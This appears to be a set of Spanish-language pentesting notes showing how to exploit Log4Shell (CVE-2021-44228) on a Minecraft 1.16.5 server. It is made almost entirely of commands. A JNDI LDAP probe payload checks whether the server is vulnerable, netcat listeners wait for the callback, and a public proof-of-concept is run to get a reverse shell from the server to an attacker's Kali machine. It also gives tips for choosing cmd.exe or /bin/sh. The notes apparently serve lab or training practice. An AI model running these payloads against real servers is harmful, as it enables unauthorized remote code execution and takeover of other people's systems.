# Log4Shell (CVE-2021-44228)

Tags: #Log4j 

## Log4j en Minecraft 1.16.5

* [Minecraft Console Client](https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20250522-285)

```bash 
# Conectarse al server colocando usuario sin contraseña
❯ chmod +x MinecraftClient    # Permisos de ejecución 

❯ ./MinecraftClient           # Ejecutar el cliente 
❯ hostname                    # Colocar el hostname (IP) del server 
	❯ /help 
	❯ ${jndi:ldap://IP_Kali/test}  # Verificar si tiene la vulnerabilidad 
```

```bash 
❯ nc -nlvp 389    # Ponerse en escucha. Si existe la vulne se conectará
```

## Usar la PoC - CVE-2021-44228

* [PoC Log4j](https://github.com/kozmer/log4j-shell-poc?source=post_page-----ddac7de10847---------------------------------------)
* [jdk oracle](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

```bash
# Descargar desde el enlace: jdk-8u202-linux-x64.tar.gz 
❯ tar -xf jdk-8u202-linux-x64.tar.gz
❯ mv jdk1.8.0_202 jdk1.8.0_20          # Cambiar el nombre al dir 


Nota:
	- El jdk debe de estar dentro de la carpeta del PoC
```

```bash 
# Ejecutar el exploit 
❯ python3 poc.py --userip IP_Kali --webport 8000 --lport 9001 
	# webport = Donde se ofrece el recurso en Kali 
	# lport = Puerto del netcat 

❯ nc -lvnp 9001  # Activar el listener para recibir la reverse shell 

- Para hacer la conexión. se debe de mandar el siguiente payload en Minecraft Console Client:
❯ ${jndi:ldap://IP_Kali:1389/a}


Notas:
- Si no se hace la conexión se debe de modificar el 'poc.py' y colocar:
	Si el server con la vulne es windows:   'String cmd = "cmd.exe"'
	Si el server con la vulne es linux:     'String cmd = "/bin/sh"'
```